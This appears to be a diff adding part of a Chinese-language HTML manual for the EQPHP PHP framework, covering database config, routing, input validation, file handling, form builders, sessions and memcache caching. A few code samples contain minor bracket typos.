+　　　　　　[id] =&gt; 74<br>
+　　　　　　[title] =&gt; PHP开源MVC框架：EQPHP V1.0版本上线发布<br>
+　　　　　　[visited_num] =&gt; 1237<br>
+　　　　　　[pub_time] =&gt; 2013-10-24<br>
+　　　　]<br><br>
+
+　　[1] =&gt; [<br>
+　　　　　　[id] =&gt; 69<br>
+　　　　　　[title] =&gt; 关于mysql数据库分布式事务处理方案<br>
+　　　　　　[visited_num] =&gt; 891<br>
+　　　　　　[pub_time] =&gt; 2013-10-22<br>
+　　　　]<br><br>
+
+]<br></i>
+</code><br><br><br>
+
+
+
+<strong>多库操作</strong><br>
+
+一、数据库连接配置，打开config/local/mysql.php文件，配置如下：<br>
+<code>
+    return [<br>
+    <b class="i24"></b>'server'=>[<br>
+    <b class="i48"></b>[<br>
+    <b class="i72"></b>'host'=>'192.168.1.100',<br>
+    <b class="i72"></b>'user'=>'root',<br>
+    <b class="i72"></b>'password'=>'',<br>
+    <b class="i72"></b>'database'=>'eqphp',<br>
+    <b class="i72"></b>'port'=>3306,<br>
+    <b class="i72"></b>'charset'=>'utf8',<br>
+    <b class="i72"></b>'type'=>'master',<br>
+    <b class="i48"></b>],<br>
+    <b class="i48"></b>[<br>
+    <b class="i72"></b>'host'=>'192.168.1.101',<br>
+    <b class="i72"></b>'user'=>'root',<br>
+    <b class="i72"></b>'password'=>'',<br>
+    <b class="i72"></b>'database'=>'eqphp',<br>
+    <b class="i72"></b>'port'=>3306,<br>
+    <b class="i72"></b>'charset'=>'utf8',<br>
+    <b class="i72"></b>'type'=>'slave',<br>
+    <b class="i48"></b>],<br>
+    <b class="i48"></b>[<br>
+    <b class="i72"></b>'host'=>'192.168.1.102',<br>
+    <b class="i72"></b>'user'=>'root',<br>
+    <b class="i72"></b>'password'=>'',<br>
+    <b class="i72"></b>'database'=>'eqphp',<br>
+    <b class="i72"></b>'port'=>3306,<br>
+    <b class="i72"></b>'charset'=>'utf8',<br>
+    <b class="i72"></b>'type'=>'slave',<br>
+    <b class="i48"></b>],<br>
+    <b class="i24"></b>],<br>
+    ];
+</code><br><br>
+
+二、使用方法：<span class="fsb">db('数据库索引')->get('SQL语句')</span> CURD方法与单库相同
+<code>
+<i>//从master库查询ID为8的会员账号</i><br>
+echo db(1)->field('member','account',8); <i>输出：eqphp</i><br><br>
+
+<i>从eqphp库查询最新5条新闻</i><br>
+$this->master=db(2);<br>
+$option['select']='id,title,pub_time,visited_num';<br>
+$option['from']='news';<br>
+$option['order']='pub_time desc';<br>
+$option['limit']='0,5';<br>
+$this->master->batch(sql($option));<br>
+</code>
+
+</div>
+
+
+<div class="item">
+<strong>pathinfo路由模式下接收GET传值</strong><br>
+1、pathinfo实现：<br>
+为了更好地优化url，EQPHP推荐使用pathinfo模式路由(如，http://www.eqphp.com/news/detail/32)，使用该路由模式需要完成下边三项：<br>
+a、确保服务器支持url_rewrite,并开启，apache下开启方法为：修改httpd.conf文件的LoadModule rewrite_module modules/mod_rewrite.so<br>这一行为启用模式，或参照互联网上更多的方法。<br>
+b、确保项目根目录下存在.htaccess文件，内容：<br>
+<code>
+#LoadModule rewrite_module modules/mod_rewrite.so<br>
+RewriteEngine on<br>
+RewriteCond $1 !^(index.php|favicon.ico|file|xhprof_html)<br>
+RewriteRule ^(.*)$ /eqphp/index.php/$1 [L]<br>
+</code>
+c、发送pathinfo模式URL给服务器（控制器）。<br><br>
+
+2、接收pathinfo模式下URL传值：<span class="fsb">url('参数位置','参数类型')</span><br>
+<code>
+<i>比如获取如下URL（http://www.eqphp.com/news/detail/32）的新闻编号32：</i><br>
+$news_id=url(2,1);<br>
+<i>//参数2 -- 32的位置，news为0，向后累加；<br>
+//参数1 -- 接收int类型ID，若该位置为其它类型为自动转换成int类型，不存在返回null;</i><br><br>
+
+<i>获取URL：http://www.eqphp.com/user/center/john中的john：</i><br>
+$user_account=url(2);
+
+</code><br>
+
+<strong>跳转、重定向</strong><br>
+1、跳转：<span class="fsb">http::redirect('目标URL片段');</span><br>
+<code>
+<i>//授权成功，跳转至后台管理首页：</i><br>
+http::redirect('admin/');<br><br>
+
+<i>跳转至另一域名：</i><br>
+header('location: http://bbs.eqphp.com/');<br>
+http::quit();
+</code><br><br>
+
+2、重定向：<span class="fsb">http::redirect('目标URL','提示信息');</span><br>
+<code>
+<i>//5s后重定向到网站首页</i><br>
+http::success('注销成功！',U_R_L,5);<br><br>
+
+<i>//重定向至404</i><br>
+http::send(404);
+</code><br><br>
+
+<strong>输出：script/json/xml</strong><br>
+<code>
+<i>//输出script脚本:http::script('脚本信息','脚本类型','是否终止脚本')</i><br>
+http::script('密码错误!','alert');<br><br>
+
+
+<i>//输出json数据:http::json('输出php数组','是否终止脚本')</i><br>
+$response=['error'=>0,'info'=>'新闻发布成功！'];<br>
+http::json($response); <i>//发送逻辑处理结果:</i><br><br>
+
+$data=[<br>
+['id'=>8,'title'=>'Mr Jim come to beijing','pub_time'=>'2013-10-08 12:12:05'],<br>
+['id'=>9,'title'=>'EQPHP V1.0版本上线发布','pub_time'=>'2013-10-18 15:11::10'],<br>
+['id'=>11,'title'=>'Jobs 逝世一周年纪念日，iphone4 大回馈','pub_time'=>'2013-10-18 15:11::10']<br>
+];<br>
+http::json($data); <i>//返回3条新闻给异步请求</i><br><br>
+
+
+<i>//输出XML:http::xml('键值数组','根节点名称','是否终止脚本')</i><br>
+$response['begin']='received request, heart beat begin';<br>
+$response['index']='heart beating...';<br>
+$response['end']='this is the reply info: heart beat end';<br>
+http::xml($response,'heartbeat_reply');<i>//回复接口协议数据</i>
+</code><br><br>
+
+<strong>curl（或socket）方式发送post请求：</strong>http::curl[/socket]('请求URL','发送数据')<br>
+确保服务器支持curl、socket并开启，以post方式发送请求，以json格式传输，返回数组。<br>
+<code>
+<i>//获取指定用户消息数</i><br>
+$url=PATH_ROOT.'api/user/message/';<br>
+$result=http::curl($url,'user_id=8');<br>
+echo $result['new_num']; <i>//输出：3</i><br><br>
+
+<i>//从指定接口获取用户基本信息：</i><br>
+$url['scheme']='https';<br>
+$url['host']='api.eqphp.com';<br>
+$url['port']='8080';<br>
+$url['path']='/user/center/info/';<br><br>
+
+$data['account']='eqphp@126.com';<br>
+$data['password']='!*EQPHP&#';<br><br>
+
+$user_info=http::curl($url,$data);<br>
+out($user_info,1);<br>
+<i>
+//输出结果：[<br>
+　　[id] => 74<br>
+　　[nickname] => 就是不告诉你<br>
+　　[qq] => 123456987<br>
+　　[phone] => 1326541***<br>
+　]<br>
+</i>
+</code>
+</div>
+
+<div class="item">
+    <strong>安全接收用户提交的数据</strong><br><br>
+    对于用户提交数据校验过滤是确保系统安全稳定的前提，使用input提供的相应方法可对$_GET,$_POST,$_REQUEST,$_COOKIE,$_SERVER进行安全接收。<br><br>
+
+    <code>
+        input::url(3,1); <i>//输出：user ，第二个参数取值有：0 - 字符串；1 - int整形；正则（表达式）</i><br>
+        input::get('page','int'); <i>//输出：3</i><br>
+        input::post('details','text'); <i>//&lt;strong&gt;重要内容&lt;/b&gt;</i><br>
+        input::request('amount','money'); <i>//100.55</i><br>
+        input::cookie('auto_login','number'); <i>//t20o42rbe40lou8pluevf73bk6</i><br>
+        input::server('request_method','/^(GET|PUT|POST|PATCH|DELETE)$/i'); <i>//patch</i><br>
+    </code><br>
+
+    <span class="fcy1 fsb">Tip：</span>在接收前会做自动isset判断，不存在则返回null. 第二个参数取值及含义如下：<br><br>
+
+    <table class="manual">
+        <tr><th>参数值</th><th>含义</th></tr>
+        <tr><td>isset</td><td>isset判断</td></tr>
+        <tr><td>[方法名]</td><td>原值原味接收,不存在返回null</td></tr>
+        <tr><td>account</td><td>转小写、去标签、过滤~^<>`'"\字符、去空格</td></tr>
+        <tr><td>title</td><td>去标签、转html实体、去空格</td></tr>
+        <tr><td>text</td><td>与title相同，但可以设定允许的html标签</td></tr>
+        <tr><td>bool</td><td>bool强转、返回0,1</td></tr>
+        <tr><td>int</td><td>int强转、取绝对值</td></tr>
+        <tr><td>number</td><td>正则/^\d+$/匹配，不成功返回0</td></tr>
+        <tr><td>float</td><td>float强制转换</td></tr>
+        <tr><td>date</td><td>Y-m-d格式校验，反转对比，不相符则返回null</td></tr>
+        <tr><td>time</td><td>H:i:s格式校验，同data</td></tr>
+        <tr><td>date_time</td><td>Y-m-d H:i:s格式校验，同data</td></tr>
+        <tr><td>many</td><td>接收一维数组，并使用implode连接</td></tr>
+        <tr><td>正则表达式</td><td>正则匹配，不成功则返回null</td></tr>
+        <tr><td>正则名称</td><td>
+            phone、email、telephone、hot_line、qq、account、md5、password、money、number、numeric、url、cid、<br>
+            zip、address、int、float、english、chinese、chinese_name、name、file_name、id、uuid、image、business_license
+        </td></tr>
+    </table><br>
+
+
+    <strong>批量接收过滤、键值映射：input::filter('验证项=>规则', '数据请求方式', '映射关系')</strong><br><br>
+    <code>
+        input::filter(['subject'=>'title','like'=>'many','birthday'=>'data','introduce'=>'text']);<br><br>
+
+        <i>//$_POST=['a' => 'Art', 'p' => '125**%24', 'id' => '8']</i><br>
+        $filter = ['a' => 'account', 'p' => 'post', 'id' => 'int'];<br>
+        $map = ['a' => 'author', 'p' => 'password', 't' => 'type'];<br>
+        $data = input::filter($filter, 'get', $map);<br>
+        <i>//['author' => 'art', 'password' => '125**%24', 'id' => 8]</i><br>
+    </code><br><br>
+
+
+    <strong>数据验证：bool validate::check('待校验数据','验证模式','规则、表达式')</strong><br><br>
+    <code>
+        <i>//常规校验：</i><br>
+        validate::check(input::post('name'),'length','2,18');<br>
+        validate::check(input::post('age'),'between','23,35');<br>
+        validate::check(input::post('sex'),'in',['male','female']);<br>
+        validate::check(input::post('birthday'),'expire',['1990-10-01','2013-12-31']);<br><br>
+
+        <i>//正则校验：</i><br>
+        validate::check(input::post('email'),'regexp','email');<br><br>
+
+        <i>//自定义函数校验：</i><br>
+        validate::check(input::post('bank_card'),'function',['help::is_bank_card',['icbc']]);<br><br>
+
+        <i>//自定义对象回调校验：</i><br>
+        validate::check(input::post('phone'),'callback',[$this,'unique',[$this->user_id]]);<br><br>
+    </code><br>
+
+    <span class="fcy1 fsb">Tip：</span>使用自定义函数和自定义对象回调校验时参数必须是数组。有以下验证模式可选：<br><br>
+    <table class="manual">
+        <tr><th>验证模式</th><th>含义</th></tr>
+        <tr><td>in</td><td>是否在指定的集合中，相当于in_array,参数可以是数组（或逗号连接的字符串）</td></tr>
+        <tr><td>not_in</td><td>与in相反</td></tr>
+        <tr><td>between</td><td>是否在指定的数字区间，参数可以是数组（或逗号连接的字符串），但只能是数字</td></tr>
+        <tr><td>not_between</td><td>与between相反</td></tr>
+        <tr><td>equal</td><td>是否与指定的值相等，做类型比较</td></tr>
+        <tr><td>not_equal</td><td>与equal相反</td></tr>
+        <tr><td>length</td><td>字符长度检测，参数可以是数组（或逗号连接的字符串），整型参数做长度相等判断</td></tr>
+        <tr><td>expire</td><td>检测时间类型数据（时间戳后字符串格式）是否在指定的范围内</td></tr>
+        <tr><td>function</td><td>自定义函数校验，函数第一个参数为待校验的数值(会自动追加到其它参数前面)，参数必须是数组</td></tr>
+        <tr><td>callback</td><td>自定义对象回调校验，函数第一个参数为待校验的数值(会自动追加到其它参数前面)，参数必须是数组</td></tr>
+        <tr><td>regexp</td><td>使用指定正则校验，参数可以是注册的正则表达式名称（regexp类的属性名称），也可以是正则表达式</td></tr>
+    </table><br><br>
+
+    <strong>验证并提示验证结果：validate::check_tip('数据',['验证模式','规则表达式'],'提示信息')</strong><br><br>
+
+    <code>
+        validate::check_tip(input::post('title'),['length','5,200'],'title length [5,200]');<br>
+        <i>//弹出警告框：alert('请将输入内容保持在5~200字之间！')</i><br><br>
+
+        validate::check_tip(input::post('email'),['regex','email'],[1,'邮箱格式错误']);<br>
+        <i>//输出json：{"error":1,"message":"\u90ae\u7bb1\u683c\u5f0f\u9519\u8bef"}</i><br>
+    </code><br>
+    <span class="fcy1 fsb">Tip：</span>提示信息格式为数组返回json-异步；字符串则以弹出警告框形式提示。<br><br>
+
+
+    <strong>批量校验、提示：validate::verify('数据包','校验规则、提示包')</strong><br><br>
+
+    <code>
+        $data=input::fetch('id,name,date,sex','get');<br><br>
+
+        $option=[<br>
+        <b class="i24"></b>'id'=>[['in',[1,2,3,4,8]],[1,'id error']],<br>
+        <b class="i24"></b>'name'=>[['length','2,18'],[2,'name length error']],<br>
+        <b class="i24"></b>'date'=>[['equal',date('Y-m-d')],[3,'date error']],<br>
+        <b class="i24"></b>'sex'=>[['callback',[$this,'check',[$data['id']]]],[4,'sex error']],<br>
+        ];<br><br>
+
+        validate::verify($data,$option);<br><br>
+    </code><br>
+
+</div>
+
+
+    <div class="item">
+
+        <strong>一、文件上传</strong><br>
+        上传是大多数web项目必不可少的功能，如上传头像、证件扫描件等。而上传也正是web站点遭受安全攻击的重灾区，接下来就看看使用EQPHP框架如何处理文件上传。<br><br>
+
+        修改好配置文件(config/local/upload.php)中允许上传的文件类型以及异常提示信息，确保library/upload.php类库文件存在，接收表单提交的$_FILE信息并调用如下方法：<br>
+        <code>
+
+            <i>//保存的文件名(文件均保存在file/目录下)</i><br>
+            $save_name='avatar/'.date('YmdHis').rand(100,999);<br><br>
+
+            <i>//单位MB,如果上传图片需要限制长宽，参数应传：<br>//[$max_size,[$min_width,$max_width],[$min_height,$max_height]]，无限制的用0填充</i><br>
+            $allow_size=3;<br><br>
+
+            <i>//上传途径，分为系统(system)上传和编辑器(editor)上传</i><br>
+            $from='system';<br><br>
+
+            try{<br>
+            <b class="i24"></b><i>//上传成功返回文件存放路径(基于根目录的路径)</i><br>
+            <b class="i24"></b>$file_name=with('upload',$_FILES['avatar'],$save_name,$allow_size,$from)->get('file_name');<br>
+            } catch (sException $e) {<br>
+            <b class="i24"></b>$message=config('upload.error.'.$e->error);<br>
+            <b class="i24"></b>http::abort($message,help::url('user.profile'),5);<br>
+            }
+
+        </code><br><br>
+
+
+        <strong>二、断点续传</strong><br>
+        <p>大文件(如ppt、视频、软件)上传经常会遇到文件还没有传完就掉线断网、通讯中断，导致白忙活一场，甚至永远传不上去。断点上传正是为解决这一问题的核心技术。</p>
+        <p>配合html5，用javaScript获取文件大小、文件MD5（spark-md5.js类库）、扩展名，file.slice(start,end)以分片(shard)形式将数据包上传到服务器。</p>
+        <p>服务器一个个接收保存为文本文件，接收完最后一个分片数据包后将所有分片（文本数据）合并为一个文件，file_md5计算文件MD5和页面脚本计算的MD5对比，相同则上传成功。</p>
+
+        <p>具体代码、交互过程详见博客：<a href="" target="_blank">断点续传 - html5大文件分片上传技术</a></p><br><br>
+
+
+
+        <strong>三、下载</strong><br>
+        <p>对于浏览器不成识别的文件类型，访问可以直接下载，可识别的就会直接打开，如图片、flash等。</p>
+        <p>若要对可下载资源做权限控制，这种方式就不可以了。利用php读取文件，输出缓冲区文件信息，即可解决这写问题，代码如下：</p>
+        <code>
+
+            <i>//第三个参数表示第一个参数是否是路径</i><br>
+            http::download($data,$file_name,$is_path);<br><br>
+
+            <i>//下载百度logo</i><br>
+            $logo_url='https://baidu.com/logo.png';<br>
+            $source=file_get_contents($logo_url);<br>
+            http::download($source,'百度logo.png');<br><br>
+
+            <i>//下载服务器文件，第三个参数表示第一个参数是否是路径</i><br>
+            $media_path=DATA_MEDIA.'credit/8_20141015153221001.mov';<br>
+            http::download($media_path,'身份认证视频.mov',true);
+        </code><br><br>
+
+        <strong>四、文件/目录操作</strong><br>
+        <code>
+            <i>//创建目录：file::folder('目录路径','权限')<br>
+                //在CACHE_PHP目录下递归创建年、月、日子目录：</i><br>
+            $new_dir=date('y').'/'.date('m').'/'.date('d');<br>
+            file::folder(CACHE_PHP.$new_dir,0751); <br><br><br>
+
+            <i>//删除目录：file::delete('目录路径','是否删除自身')<br>
+                //删除CACHE_PHP目录下的所有文件和目录：</i><br>
+            file::delete(CACHE_PHP,false); <br><br><br>
+
+            <i>//修改目录/文件的权限、属主、所属分组：file::modify('目录路径','执行动作','目标值')<br>
+                //修改CACHE_PHP目录下的所有文件和目录权限均为775，属主为apache，分组为root：</i><br>
+            file::modify(CACHE_PHP,'chmod',0775); <br>
+            file::modify(CACHE_PHP,'chown','apache'); <br>
+            file::modify(CACHE_PHP,'chgrp','root'); <br><br><br>
+
+
+            <i>//目录、文件查找遍历：file::scan('搜索目录','搜索名','查找结果清单' ,'文件全名(base)/文件名(file)/扩展名(extension)')<br>
+                //列出LOG_SQL目录下的日志文件：</i><br>
+            file::scan(LOG_SQL,'log',$data); <br>
+            <i>[<br>
+                <b class="i24"></b>[0] => /var/www/eqphp/log/sql/2013_09_19_s.log<br>
+                <b class="i24"></b>[1] => /var/www/eqphp/log/sql/2013_09_20_s.log<br>
+                <b class="i24"></b>[2] => /var/www/eqphp/log/sql/2013_09_21_s.log<br>
+                <b class="i24"></b>[3] => /var/www/eqphp/log/sql/2013_09_23_s.log<br>
+                ]
+            </i><br><br>
+
+            <i>//查找文件名是error的文件：</i><br>
+            file::scan(PATH_LOG,'error',$data,'file');<br>
+            <i>[<br>
+                <b class="i24"></b>[0] => E:/wamp/www/log/topic/error.log<br>
+                ]
+            </i><br><br><br>
+
+            <i>//查找指定目录下的指定扩展名的所有文件：file::search('搜索目录','文件名','搜索结果','模式')<br>
+                //搜索PATH_SERVER目录下的s_user.php文件：</i><br>
+            file::search(PATH_SERVER,'s_user',$data); <br>
+            <i>[<br>
+                <b class="i24"></b>[0] => /var/www/server/s_user.php<br>
+                ]
+            </i><br><br>
+
+            <i>//搜索PATH_CONFIG目录下的db.php文件</i><br>
+            $result=file::search(PATH_CONFIG,'db',$data,true);<br>
+            <i>//$result：/var/www/config/db.php</i><br>
+            <i>//第四个参数为true时：由外向里(先父级目录，后子级目录)查到第一个便终止反回结果</i><br>
+            <i>要由里向外（如配置文件中环境的优先于公共的）区，第四个参数置为false,取$data的最后一个</i><br><br><br>
+
+
+            <i>//写文件：file::write('文件名称',文件内容','读写模式')，读写模式请参照手册 fopen 函数<br>
+                //在LOG_LOG目录下创建test.log，并写入“这是一一个测试文件。”：</i><br>
+            file::write(PATH_LOG.'test.log','这是一一个测试文件。');<br><br><br>
+
+            <i>//获取指定文件的指定行内容：file::read('指定文件','指定行')，<br>
+                //行号为0则返回全部，行号大于总行数返回倒数第二行</i><br>
+            file::read(LOG_TOPIC.'error.log',100);<br>
+            <i>//CORE_WARNING : PHP Startup:  [Unknown - 0]</i><br><br>
+
+        </code>
+
+    </div>
+
+
+<div class="item">
+
+    <strong>构建DOM</strong><br><br>
+    <code>
+        <i>//闭合标签：html::tag_name(string $content[, array $attribute])</i><br>
+        html::div('盒模型',['id'=>'login', 'class'=>"box"]);<br>
+        <i>&lt;div id="login" class="box"&gt;盒模型&lt;/div&gt;</i><br><br>
+
+        <i>//列表：html::ul(array $data[, array $attribute])</i><br>
+        html::ul(['路由','控制器','视图模板'],['id'=>'menu', 'class'=>"ul-li"]);<br>
+        <i>&lt;ul id="menu" class="ul-li"&gt;<br>
+            &lt;li&gt;路由&lt;/li&gt;<br>
+            &lt;li&gt;控制器&lt;/li&gt;<br>
+            &lt;li&gt;视图模板&lt;/li&gt;<br>
+        &lt;/ul&gt;</i><br><br>
+
+        <i>//列表：html::ul(array $data[, array $attribute])</i><br>
+        html::dl(['MVC','控制器','视图模板'],['id'=>'menu', 'class'=>"dl-dd"]);<br>
+        <i>&lt;dl id="menu" class="dl-dd"&gt;<br>
+            &lt;dt&gt;MVC&lt;/dt&gt;<br>
+            &lt;dd&gt;控制器&lt;/dd&gt;<br>
+            &lt;dd&gt;视图模板&lt;/dd&gt;<br>
+         &lt;/dl&gt;</i><br><br>
+
+        <i>//表格：html::table(array $data[, array $attribute])</i><br>
+        $data[0]=['编号','手机号','用户名');<br>
+        $data[1]=[<br>
+        <b class="i24"></b>['id'=>1,'phone'=>'1325654***','name'=>'Art'],<br>
+        <b class="i24"></b>['id'=>2,'phone'=>'1872554***','name'=>'Jim'],<br>
+        <b class="i24"></b>['id'=>3,'phone'=>'1362558***','name'=>'lily'],<br>
+        ];<br>
+        html::table($data,['id'=>'user_list', 'class'=>"table-td"));<br>
+        <i>&lt;table id="user_list" class="table-td"&gt;<br>
+                &lt;tr&gt;&lt;th&gt;编号&lt;/th&gt;&lt;th&gt;手机号&lt;/th&gt;&lt;th&gt;用户名&lt;/th&gt;&lt;/tr&gt;<br>
+                &lt;tr&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;1325654***&lt;/td&gt;&lt;td&gt;Art&lt;/td&gt;&lt;/tr&gt;<br>
+                &lt;tr&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;1872554***&lt;/td&gt;&lt;td&gt;Jim&lt;/td&gt;&lt;/tr&gt;<br>
+                &lt;tr&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;1362558***&lt;/td&gt;&lt;td&gt;lily&lt;/td&gt;&lt;/tr&gt;<br>
+            &lt;/table&gt;</i><br><br>
+
+
+
+        <i>//图片：html::image(string $src[, array $attribute])</i><br>
+        html::image('photo/avatar/8.gif',['id'=>'avatar', 'class'=>"image"));<br>
+        <i>&lt;img src="photo/avatar/8.gif" id="avatar" class="image"&gt;</i><br><br>
+
+        <i>//脚本：html::script(string $data[, string $type])</i><br>
+        <i>//$type取值有：patch/back_refresh/alert/alert/back/alert_skip/skip/script</i><br>
+        html::script('password error','alert');<br>
+        <i>&lt;script type="text/javascript"&gt;alert("password error");&lt;/script&gt;</i><br><br>
+
+        <i>//样式链接：html::link(string $href[, string $type[, string $rel]])</i><br>
+        html::link('public/style/basic.css');<br>
+        <i>&lt;link rel="stylesheet" type="text/css" href="public/style/basic.css" /&gt;</i><br><br>
+
+        <i>//meta信息：html::meta($content, $attribute[, $is_name])</i><br>
+        html::meta('Art','author');<br>
+        <i>&lt;meta name="author" Content="Art" /&gt;</i><br>
+    </code><br><br>
+
+
+    <strong>构建表单</strong><br><br>
+    <code>
+        <i>//表单开始：form::open('name','action','attribute','csrf')</i><br>
+        form::open('login','login','user_login|login','cba1af6f');<br>
+        <i>&lt;form id="user_login" class="login" name="login" action="eqphp/login" method="post" target="_self"&gt;<br>
+            &lt;input name="eqphp_csrf_token" type="hidden" value="cba1af6f"&gt;</i><br><br>
+
+        <i>//下拉列表：form::select('name','option','selected_option','attribute')</i><br>
+        $option=['上海','北京','天津','重庆','西安','杭州'];<br>
+        form::select('city',$option,4,null);<br>
+        <i>&lt;select id="city" class="city" name="city"&gt;<br>
+        &lt;option value="0"&gt;上海&lt;/option&gt;<br>
+        &lt;option value="1"&gt;北京&lt;/option&gt;<br>
+        &lt;option value="2"&gt;天津&lt;/option&gt;<br>
+        &lt;option value="3"&gt;重庆&lt;/option&gt;<br>
+        &lt;option value="4" selected&gt;西安&lt;/option&gt;<br>
+        &lt;option value="5"&gt;杭州&lt;/option&gt;<br>
+        &lt;/select&gt;</i><br><br>
+
+        <i>//复选框：form::checkbox('name','option','selected_option','attribute')</i><br>
+        $option=['数学','语文','英语','化学','地理','历史'];<br>
+        form::checkbox('subject',$option,'0|2|3|4');<br>
+        <i>&lt;input name="subject[]" type="checkbox" value="0" checked /&gt;数学<br>
+        &lt;input name="subject[]" type="checkbox" value="1" /&gt;语文<br>
+        &lt;input name="subject[]" type="checkbox" value="2" checked /&gt;英语<br>
+        &lt;input name="subject[]" type="checkbox" value="3" checked /&gt;化学<br>
+        &lt;input name="subject[]" type="checkbox" value="4" checked /&gt;地理<br>
+        &lt;input name="subject[]" type="checkbox" value="5" /&gt;历史<br>
+    </i><br><br>
+
+        <i>//单选按钮：form::radio('name','option','selected_option','attribute')</i><br>
+        $option=['保密','男','女'];<br>
+        form::radio('sex',$option,1);<br>
+        <i>&lt;input name="sex" type="radio" value="0" /&gt;保密<br>
+        &lt;input name="sex" type="radio" value="1" checked /&gt;男<br>
+        &lt;input name="sex" type="radio" value="2" /&gt;</i><br><br>
+
+        <i>//文本输入框-密码：form::text('name','value','attribute')</i><br>
+        form::text('account','账号：','account|user');<br>
+        <i>&lt;input id="account" class="user" name="account" type="text" value="账号：" /&gt;</i><br>
+        form::password('password','密码：','password|user_password');<br>
+        <i>&lt;input id="password" class="user_password" name="pwd" type="password" value="密码：" /&gt;
+    </i><br><br>
+
+        <i>//隐藏域-文件域：form::file('name','value','attribute')</i><br>
+        form::hidden('begin_time','14:24:32',null);<br>
+        <i>&lt;input id="begin_time" class="begin_time" name="begin_time" type="hidden" value="14:24:32" /&gt;</i><br>
+        form::file('upload_file','',null);<br>
+        <i>&lt;input id="upload_file" class="upload_file" name="upload_file" type="file" value="" /&gt;
+    </i><br><br>
+
+        <i>//文本域：form::textarea('name','value','attribute')</i><br>
+        form::textarea('info','自我介绍：','info|textarea');<br>
+        <i>&lt;textarea id="info" class="textarea" name="info"&gt;自我介绍：&lt;/textarea&gt;
+    </i><br><br>
+
+        <i>//按钮：form::submit('name','value','attribute')</i><br>
+        form::submit('login_submit','登录','login_btn|login_btn');<br>
+        <i>&lt;input id="login_btn" class="login_btn" name="login_submit" type="submit" value="登录" /&gt;
+    </i><br>
+        form::reset('clear','重设','reset_btn|reset_btn');<br>
+        <i>&lt;input id="reset_btn" class="reset_btn" name="clear" type="reset" value="重设" /&gt;
+    </i><br>
+        form::button('register','注册','reg_btn|reg_btn');<br>
+        <i>&lt;input id="reg_btn" class="reg_btn" name="register" type="button" value="注册" /&gt;
+    </i><br><br>
+
+        <i>//验证码：form::captcha('check_name','title','check_img|check_img')</i><br>
+        form::captcha('login','看不清？点击更换','login_img|login_img');<br>
+        <i>&lt;img id="login_img" class="login_img" src="http://www.eqphp.com/code/img/?check=login&r_num="<br>alt="看不清？点击更换" title="看不清？点击更换" onclick="this.src=this.src+Math.random();"&gt;</i><br><br>
+
+        <i>//表单结束：form::close()</i><br>
+        form::close();<br>
+        <i>&lt;/form&gt;</i>
+    </code><br><br>
+
+</div>
+
+<div class="item">
+    <strong>cookie</strong><br>
+    <code>
+        <i>//设置cookie：http::cookie('名称','值','周期')</i><br>
+        http::cookie('follow_channel','cctv6');<br><br>
+
+
+        <i>//获取cookie：input::cookie(['名称','获取类型'])</i><br>
+        input::cookie('follow_channel'); <i>//cctv6</i>
+    </code>
+    <br><br>
+
+
+
+    <strong>session</strong><br>
+    1、session相关环境配置：<span class="fsb">system::init()</span><br>
+    <code>
+        <i>//设置session存放方式：文件/数据库/内存(memcached)</i><br>
+        ini_set('session.save_handler','files'); <i>//DB-user/memcache-memcached</i><br><br>
+
+        <i>//设置session存放位置：文件/内存(memcached)</i><br>
+        session_save_path(PATH_CACHE.'session'); <i>//memcache-127.0.0.1:11211</i><br><br>
+
+        <i>//设置session作用的域名范围：</i><br>
+        ini_set('session.cookie_domain','eqphp.com'); <br><br>
+
+        <i>//开启session</i><br>
+        session_start();
+    </code><br><br>
+
+    2、session存取(file)<br>
+    <code>
+        <i>//设置session：session::set('名称','值')</i><br>
+        session::set('id',8);<br>
+        $user_info=['id'=>8,'account'=>'eqphp','access'=>'1|2|3|5|8'];<br>
+        session::set('user_info',$user_info);<br>
+        session::set('user_info.nick_name','Art');<br><br>
+
+        <i>//K-V数组批量设置：session::set($data)</i><br>
+        $data['id']=8;<br>
+        $data['account']='eqphp';<br>
+        $data['access']='1|2|3|5|8';<br>
+        $data['email']='example@126.com';<br>
+        session::set($data);<br><br>
+
+        <i>//获取session：session::get('名称','是否立即卸载')</i><br>
+        echo session::get('email'); <i>//输出：example@126.com</i><br>
+        echo session::get('login_code',true); <i>//输出：5f6d</i><br>
+        session::set('user_info.access');<br><br>
+
+        <i>//卸载session：session::clear('名称')</i><br>
+        session::clear('email'); <i>//删除email</i><br>
+        session::clear('user_info.account'); <i>//删除email</i><br>
+        session::clear(null); <i>//清空所有session</i><br>
+    </code><br><br>
+
+    3、session的简洁用法：session('名称','值')<br>
+    <code>
+        session(null); <i>//清空所有session</i><br>
+        session($data); <i>//K-V数组批量设置session</i><br>
+        session($key,true); <i>//获取$key的session后并卸载$key</i><br>
+        session($key,$value); <i>//设置session</i><br>
+        session($key,null); <i>//卸载$key的session</i><br>
+        session($key); <i>//获取session</i><br>
+    </code><br><br><br>
+
+<strong>缓存(cache)</strong><br>
+缓存这一古老话题，对每个做web应用的人来说再熟悉不过了，PHP缓存大致分为编译缓存和数据缓存。对解释性语言PHP来说，编译缓存可以大幅提升产品性能，常用的OPcode缓存技术有：Xcache、APC、Accelerator等，对开发人员来说不需要做太多工作，只需要运维人员在服务器上安装相应环境配置即可。<br>
+数据缓存，根据存放位置不同可分为内存级缓存和硬盘缓存。<br><br>
+一、内存级缓存,由于内存大小有限，资源珍贵，而且性能也比硬盘存取快很多，一般应用对重要数据资源进行内存缓存。目前技术主要有memcache和Redis，接下来重点说说K-V特色的memcache缓存，废话不多说，直接看用法：<br>
+1、简单应用：确保服务端配置好memcache，打开config/local/memcache.php文件：<br>
+<code>
+    
+
+return [<br>
+    <b class="i24"></b>'memcache'=>['host'=>'localhost','port'=>11211,'weight'=>40,],<br>
+    <b class="i24"></b>//'mc1'=>['host'=>'192.168.0.103','port'=>11211,'weight'=>30,],<br>
+    <b class="i24"></b>//'mc2'=>['host'=>'192.168.0.111','port'=>11211,'weight'=>30,],<br>
+    ];
+</code><br>
+代码中这样写：<br>
+<code>
+<i>//获取一个memcache实例：</i><br>
+$memcache=memory::init('memcache');<i>//redis实例化同此</i><br><br>
+
+<i>//设置：$memcache->set('键名','值','压缩模式','周期')</i><br>
+<i>//将EQPHP无压缩(MEMCACHE_COMPRESSED,zlib压缩)下缓存300秒(0,永久(不超过30天))</i><br>
+$memcache->set('memcache','EQPHP',0,300);<br>
+$memcache->set('version','1.0',0,0);<br><br>
+
+<i>//修改：$memcache->replace('欲替换键名','新值','压缩模式','周期')</i><br>
